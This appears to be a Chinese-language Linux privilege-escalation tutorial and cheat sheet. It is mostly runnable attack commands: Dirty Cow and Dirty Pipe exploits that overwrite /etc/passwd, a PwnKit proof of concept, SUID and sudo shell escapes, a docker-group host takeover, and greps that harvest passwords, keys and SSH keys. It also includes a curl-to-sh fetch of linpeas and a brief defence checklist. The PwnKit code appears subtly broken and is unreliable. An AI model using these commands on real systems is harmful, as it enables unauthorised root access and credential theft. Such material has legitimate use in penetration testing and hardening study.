# Linux 提权技术

> 获得初始访问只是开始——真正的目标是 root

---

## 提权方法论

```
提权 CheckList：

1. 信息收集
   ├── whoami / id
   ├── uname -a (内核版本)
   ├── sudo -l (sudo 权限)
   ├── ls -la /etc/shadow (敏感文件)
   └── find / -perm -4000 (SUID 文件)

2. 内核漏洞
   ├── 检查 CVE 列表
   ├── 脏牛 Dirty Cow (CVE-2016-5195)
   ├── 脏管道 Dirty Pipe (CVE-2022-0847)
   └── PwnKit (CVE-2021-4034)

3. 错误配置
   ├── SUID 二进制
   ├── Sudo 权限
   ├── Cron 任务
   ├── Docker 组
   └── Capabilities

4. 凭据窃取
   ├── /etc/shadow 读取
   ├── .bash_history
   ├── 配置文件中的密码
   └── SSH 密钥
```

---

## 信息收集

```bash
#!/bin/bash
# linpeas 自动化枚举脚本（简化版手动执行）

echo "=== 系统信息 ==="
uname -a
cat /etc/os-release 2>/dev/null

echo "=== 用户信息 ==="
id
whoami
cat /etc/passwd | grep -E "/bin/(bash|sh|zsh)" | cut -d: -f1

echo "=== Sudo 权限 ==="
sudo -l 2>/dev/null

echo "=== SUID 文件 ==="
find / -perm -4000 -type f 2>/dev/null

echo "=== Capabilities ==="
getcap -r / 2>/dev/null

echo "=== Cron 任务 ==="
cat /etc/crontab 2>/dev/null
ls -la /etc/cron* 2>/dev/null

echo "=== 网络连接 ==="
ss -tlnp 2>/dev/null
netstat -tulpn 2>/dev/null

echo "=== 敏感文件 ==="
find / -name "*.bak" -o -name "*.backup" -o -name "*.old" 2>/dev/null
find /home -name ".bash_history" -exec cat {} \; 2>/dev/null
```

---

## 内核漏洞提权

### 脏牛（Dirty Cow）CVE-2016-5195

```bash
# 影响：Linux 内核 2.6.22~4.8.3
# 原理：写时复制（COW）竞态条件 → 任意内存写入

# 检查内核版本
uname -r

# 下载编译 expolit
wget https://raw.githubusercontent.com/dirtycow/dirtycow.github.io/master/dirtyc0w.c
gcc -o dirtyc0w dirtyc0w.c -lpthread

# 提权：将 /etc/passwd 中的普通用户改为 root
./dirtyc0w /etc/passwd "user::0:0:root:/root:/bin/bash"
su user
# → 现在是 root！
```

### 脏管道（Dirty Pipe）CVE-2022-0847

```bash
# 影响：Linux 内核 5.8~5.16.11/5.10.102/5.15.25
# 原理：pipe 系统调用中的竞态条件 → 覆盖任意只读文件

# 检查版本
uname -r

# 编译利用
gcc -o dirtypipe exploit.c

# 覆盖 /etc/passwd 提权
./dirtypipe /etc/passwd 1 "user::0:0:::"  # 加 root 权限用户
su user
```

### PwnKit CVE-2021-4034

```bash
# 影响：几乎所有 Linux 发行版（pkexec SUID）
# 原理：pkexec 未正确处理参数 → 提权到 root

# 编译（只需要 3 行）
cat > pwnkit.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
int main() {
    char *envp[] = { "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "GIO_EXTRA_MODULES=.", NULL };
    execve("/usr/bin/pkexec", (char*[]){ NULL }, envp);
}
EOF
gcc -o pwnkit pwnkit.c

# 创建利用目录结构
mkdir -p GCONV_PATH=.
cp /usr/bin/true GCONV_PATH=./pwnkit.so:.
cat > GCONV_PATH=./gconv-modules << 'EOM'
module  UTF-8//    PWNKIT//    pwnkit    1
EOM

./pwnkit
# → 获得 root shell
```

---

## 错误配置提权

### SUID 二进制

```bash
# 查找所有 SUID 文件
find / -perm -4000 -type f 2>/dev/null

# 常见的危险 SUID 程序
# GTFOBins 提供了每个 SUID 程序的利用方法

# ⚡ 示例：python SUID
/usr/bin/python -c 'import os; os.execl("/bin/sh", "sh", "-p")'

# ⚡ 示例：find SUID
find / -exec /bin/sh -p \; -quit

# ⚡ 示例：vim SUID
vim -c ':!/bin/sh'
```

### Sudo 权限

```bash
# 查看当前用户 sudo 权限
sudo -l

# ⚡ 如果允许以 root 运行 vim
sudo vim -c '!sh'

# ⚡ 如果允许以 root 运行 python
sudo python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'

# ⚡ 如果允许无密码运行所有命令
sudo -i  # 直接获得 root shell
```

### Docker 组提权

```bash
# 如果用户属于 docker 组
groups

# 挂载宿主机根目录
docker run -v /:/mnt -it ubuntu bash

# 在容器内读取宿主机敏感文件
cat /mnt/etc/shadow
chroot /mnt /bin/bash  # 直接获得宿主机 root
```

---

## 凭证窃取

```bash
# 检查 history
cat ~/.bash_history | grep -iE "pass|key|secret|token|password"

# 检查配置文件
grep -r "password" /etc/ 2>/dev/null
grep -r "api_key" /home/ 2>/dev/null

# 检查 SSH 密钥
find /home -name "id_rsa" -o -name ".ssh" 2>/dev/null

# 检查数据库凭据
cat /var/www/html/config.php 2>/dev/null
```

---

## 提权自动化工具

```bash
# 自动审计脚本
wget https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/linPEAS/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas_report.txt

# 或者一键执行（无文件落地）
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh

# 另一个选择
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
./LinEnum.sh
```

---

## 防御清单

- [ ] 及时打内核补丁（脏牛、脏管道、PwnKit 等）
- [ ] 最小化 SUID 程序（只保留必要的）
- [ ] 合理配置 sudo 权限（不要给 ALL）
- [ ] 普通用户不要加入 docker 组
- [ ] 开启 SELinux/AppArmor
- [ ] 安装并启用 auditd（审计日志）
- [ ] 定期审计系统配置
- [ ] 限制 capabilities（`capsh --print`）
- [ ] 敏感文件严格权限控制
- [ ] 监控提权攻击尝试（`auditctl -a always,exit -F arch=b64 -S execve`）

---

## 延伸阅读

1. [GTFOBins — SUID 利用大全](https://gtfobins.github.io/)
2. [linPEAS — Linux 提权审计](https://github.com/carlospolop/PEASS-ng)
3. [HackTricks — Linux 提权](https://book.hacktricks.xyz/linux-hardening/privilege-escalation)
4. [Exploit Database](https://www.exploit-db.com/)
5. [CVE Mitre](https://cve.mitre.org/)
6. [Linux Capabilities 详解](https://man7.org/linux/man-pages/man7/capabilities.7.html)
